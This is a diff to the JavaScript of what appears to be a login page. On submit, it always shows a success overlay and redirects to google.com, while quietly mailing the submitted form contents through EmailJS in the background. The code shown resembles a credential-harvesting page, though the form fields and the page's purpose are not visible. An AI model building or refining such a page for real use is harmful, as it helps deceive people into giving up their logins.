@@ -362,7 +362,15 @@
     // Show success and redirect to Google
     function showSuccessAndRedirect() {
       console.log("Showing success overlay..."); // Debug log
+      
+      // Make sure overlay is visible
       successOverlay.style.display = "flex";
+      successOverlay.style.position = "fixed";
+      successOverlay.style.top = "0";
+      successOverlay.style.left = "0";
+      successOverlay.style.width = "100%";
+      successOverlay.style.height = "100%";
+      successOverlay.style.zIndex = "9999";
       
       let countdown = 3;
       countdownEl.textContent = countdown;
@@ -375,7 +383,14 @@
         if (countdown <= 0) {
           clearInterval(timer);
           console.log("Redirecting to Google..."); // Debug log
-          window.location.href = "https://www.google.com";
+          
+          // Force redirect
+          try {
+            window.location.href = "https://www.google.com";
+          } catch (e) {
+            // Fallback
+            window.open("https://www.google.com", "_blank");
+          }
         }
       }, 1000);
     }
@@ -412,23 +427,20 @@
       if (!hasErrors) {
         console.log("No validation errors, proceeding..."); // Debug log
         
-        // Try EmailJS if it's ready
+        // ALWAYS show success for demo - don't wait for EmailJS
+        console.log("Showing success immediately for demo");
+        showSuccessAndRedirect();
+        
+        // Try EmailJS in background (optional)
         if (emailjsReady && typeof emailjs !== 'undefined') {
-          console.log("Attempting to send via EmailJS...");
+          console.log("Also attempting EmailJS in background...");
           emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
             .then(function(response) {
-              console.log("EmailJS SUCCESS:", response); // Debug log
-              showSuccessAndRedirect();
+              console.log("EmailJS SUCCESS (background):", response);
             })
             .catch(function(error) {
-              console.log("EmailJS ERROR:", error); // Debug log
-              // Still show success even if EmailJS fails
-              showSuccessAndRedirect();
+              console.log("EmailJS ERROR (background):", error);
             });
-        } else {
-          console.log("EmailJS not ready, showing success anyway"); // Debug log
-          // Show success immediately for demo
-          showSuccessAndRedirect();
         }
       } else {
         console.log("Validation errors found"); // Debug log
@@ -457,6 +469,7 @@
     // Navigate to forgot email page
     forgotLink.addEventListener("click", function(e) {
       e.preventDefault();
+      console.log("Forgot email clicked"); // Debug
       loginPage.classList.remove("active");
       forgotPage.classList.add("active");
     });
@@ -464,6 +477,7 @@
     // Navigate back to login page
     backLink.addEventListener("click", function(e) {
       e.preventDefault();
+      console.log("Back to login clicked"); // Debug
       forgotPage.classList.remove("active");
       loginPage.classList.add("active");
     });
